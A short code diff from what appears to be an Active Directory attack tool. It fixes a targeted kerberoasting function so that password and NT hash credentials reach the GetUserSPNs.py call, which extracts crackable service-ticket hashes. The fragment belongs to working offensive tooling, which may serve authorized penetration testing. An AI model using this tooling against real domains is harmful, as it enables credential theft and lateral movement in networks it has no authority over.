@@ -147,10 +147,18 @@ async def perform_targeted_kerberoast(
     imp_auth = build_impacket_auth(
         domain, source_principal, password, nt_hash, dc_ip=dc_ip,
     )
+    # NB: ``kerberoast`` builds its own ``DOMAIN/user:password`` target
+    # string internally, so we must forward password/nt_hash here as
+    # well — passing them only to build_impacket_auth leaves the target
+    # string's credential slot empty and the GetUserSPNs.py invocation
+    # ends up unauthenticated (which then either hangs or returns
+    # zero hashes).
     roast = await kerberoast(
         domain=domain,
         username=source_principal,
         auth_args=imp_auth,
+        password=password,
+        nt_hash=nt_hash,
         dc_ip=dc_ip,
         target_user=target_user,
     )
